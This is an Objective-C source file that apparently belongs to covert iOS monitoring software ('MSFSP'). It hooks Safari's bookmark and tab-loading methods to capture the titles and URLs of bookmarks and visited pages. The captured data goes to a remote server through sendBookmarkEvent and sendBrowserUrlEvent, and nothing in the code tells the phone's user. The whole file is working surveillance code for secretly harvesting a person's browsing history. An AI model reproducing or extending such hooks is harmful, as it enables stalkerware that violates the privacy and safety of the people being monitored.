//
//  BrowserUrl.h
//  MSFSP
//
//  Created by Suttiporn Nitipitayanusad on 4/26/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MSFSP.h"
#import "BookmarkInfoViewController.h"
#import "WebBookmark.h"
#import "BrowserController.h"
#import "TabDocument.h"
#import "BookmarkInfo.h"
#import "TabController.h"
#import "TabDocument+IOS6.h"

// this will be called when adding the new bookmark
HOOK(BookmarkInfoViewController, _save, void) {
	WebBookmark* bookmark = [self bookmark];
	CALL_ORIG(BookmarkInfoViewController, _save);
	
	NSString* bookmarkTitle = [bookmark title];
	NSString* bookmarkAddress = [bookmark address];
	
	DLog(@"======= Save New Bookmark !!! ========");
	DLog(@"bookmark : title = %@, address = %@", bookmarkTitle, bookmarkAddress);
	DLog(@"Is editing field? %d", [self isEditingField]);
	//DLog(@"icon : %@", [bookmark iconData])						// NOT available in IOS 4.3.3
	//DLog(@"Fetched icon data = %d", [bookmark fetchedIconData])	// NOT available in IOS 4.3.3
	DLog(@"======================================");
	
	if ([[BookmarkInfo sharedBookmarkInfo] mCanSaveBookmark]) {
		[BookmarkInfo sendBookmarkEvent:bookmarkTitle address: bookmarkAddress];	
	}
	[[BookmarkInfo sharedBookmarkInfo] setMCanSaveBookmark:FALSE];
}

// this will be called when adding the new bookmark or creating new bookmark folder
HOOK(BookmarkInfoViewController, saveChanges, void) {
	WebBookmark* bookmark = [self bookmark];
	
	CALL_ORIG(BookmarkInfoViewController, saveChanges);
	
	NSString* bookmarkTitle = [bookmark title];
	NSString* bookmarkAddress = [bookmark address];
	
	DLog(@"======= Save change !!! ========");
	DLog(@"bookmark : title = %@, address = %@", bookmarkTitle, bookmarkAddress);
	DLog(@"Is editing field? %d", [self isEditingField]);
	//DLog(@"icon : %@", [bookmark iconData])						// NOT available in IOS 4.3.3
	//DLog(@"Fetched icon data = %d", [bookmark fetchedIconData])	// NOT available in IOS 4.3.3
	
	BookmarkInfo *shareBookmarkInfo = [BookmarkInfo sharedBookmarkInfo];
	DLog (@"bookmark title --> %@", [shareBookmarkInfo mBookmarkTitle])
	DLog (@"bookmark address --> %@", [shareBookmarkInfo mBookmarkAddress])
	DLog(@"================================");
	if (![[shareBookmarkInfo mBookmarkTitle] isEqualToString:bookmarkTitle] || 
		![[shareBookmarkInfo mBookmarkAddress] isEqualToString:bookmarkAddress]) {
		DLog (@"bookmark is modified")
		[BookmarkInfo sendBookmarkEvent:bookmarkTitle address:bookmarkAddress];
		[[BookmarkInfo sharedBookmarkInfo] setMCanSaveBookmark:FALSE];
	} else {
		DLog (@"bookmark is not modified")
	}
}

HOOK(BookmarkInfoViewController, loadView, void) {
	[[BookmarkInfo sharedBookmarkInfo] setMCanSaveBookmark:TRUE];
	
	CALL_ORIG(BookmarkInfoViewController, loadView);
	
	WebBookmark* bookmark = [self bookmark];
	
	BookmarkInfo *shareBookmarkInfo = [BookmarkInfo sharedBookmarkInfo];
	[shareBookmarkInfo setMBookmarkTitle:[bookmark title]];
	[shareBookmarkInfo setMBookmarkAddress:[bookmark address]];
	DLog(@"======= Load View !!! ========");
	DLog(@"bookmark : title = %@, address = %@", [bookmark title], [bookmark address]);
	//DLog(@"icon : %@", [bookmark iconData])						// NOT available in IOS 4.3.3	
	DLog(@"==============================");
}

//HOOK(BrowserController, updateAddress$forTabDocument$, void, BOOL arg1, id arg2) {
//	//TabDocument* tabDocument = arg2;
//	CALL_ORIG(BrowserController, updateAddress$forTabDocument$, arg1, arg2);
//	//DLog(@"======= Update address : %d : %@", arg1, [tabDocument URL]);
//}

//HOOK(BrowserController, snapshotForTabDocument$, id, id arg1) {
//	TabDocument* tabDocument = arg1;
//	id returnValue = CALL_ORIG(BrowserController, snapshotForTabDocument$, arg1);
//	/*
//	-------------------------------------------------------------------------------------------- 
//	Obsolete code: Beside after opening the website, this method is called when click tabs view.
//					This result in duplication of event sent to the server
//	--------------------------------------------------------------------------------------------	
//	 
//	DLog(@"==== snapshotForTabDocument, class = %@, %@", [[tabDocument URL] class], [tabDocument URL]);
//	DLog(@"==== Is loading = %d", [tabDocument isLoading]);
//	DLog(@"==== Is start load from main fram = %d", [tabDocument isStartingLoadForMainFrame]);
//	DLog(@"==== Is pop up = %d", [tabDocument isPopup]);
//	DLog(@"==== Is closed = %d", [tabDocument isClosed]);
//	DLog(@"==== title of document = %@", [tabDocument title]);
//	DLog(@"================================");
//	
//	if ([tabDocument isLoading] == FALSE) {
//		DLog(@"======= Send URL Event to the server !!! ========");
//		[BookmarkInfo sendBrowserUrlEvent:[tabDocument title] address: [[tabDocument URL] absoluteString]];
//	}
//	 */
//	return returnValue;
//}

#pragma mark -
#pragma mark Browser url IOS4, IOS5
#pragma mark -

HOOK(TabController, tabDocument$didFinishLoadingWithError$, void, id arg1, BOOL arg2) {
	DLog(@"================================");
	DLog(@"==== tabDocument didFinishLoadingWithError=== ");
	//DLog(@"arg1 %@", arg1);
	DLog(@"arg2 %d", arg2);
	
	TabDocument* tabDocument = arg1;
	DLog(@"==== finishLoading, class = %@, %@", [[tabDocument URL] class], [tabDocument URL]);
	DLog(@"==== Is loading = %d", [tabDocument isLoading]);
	DLog(@"==== Is start load from main fram = %d", [tabDocument isStartingLoadForMainFrame]);
	DLog(@"==== Is pop up = %d", [tabDocument isPopup]);
	DLog(@"==== Is closed = %d", [tabDocument isClosed]);
	DLog(@"==== title of document = %@", [tabDocument title]);
	DLog(@"================================");	
	if ([tabDocument isLoading] == FALSE) {
		DLog(@"======= Send URL Event to the server !!! ========");
		[BookmarkInfo sendBrowserUrlEvent:[tabDocument title] address: [[tabDocument URL] absoluteString]];
	}	
	CALL_ORIG(TabController, tabDocument$didFinishLoadingWithError$, arg1, arg2);
	
}

#pragma mark -
#pragma mark Browser url IOS6
#pragma mark -

HOOK(TabDocument, browserLoadingController$didFinishLoadingWithError$dataSource$, void, id arg1,id arg2,id arg3) {
	DLog(@"==================== HOOK  tabDocument browserLoadingController$didFinishLoadingWithErro$dataSourcer ==================== ");
	DLog (@"arg1 = %@, arg2 = %@, arg3 = %@", arg1, arg2, arg3); // arg1 = WebUIBrowserLoadingController, arg2 = nil, arg3 = nil
	DLog(@"self isLoading %d" ,[self isLoading]);
	if ([self isLoading] == FALSE) {
		DLog(@"======= Send URL Event to the server !!! ========");
		[BookmarkInfo sendBrowserUrlEvent:[self title] address: [[self URL] absoluteString]];
	}	
	CALL_ORIG(TabDocument,  browserLoadingController$didFinishLoadingWithError$dataSource$, arg1,arg2,arg3);
}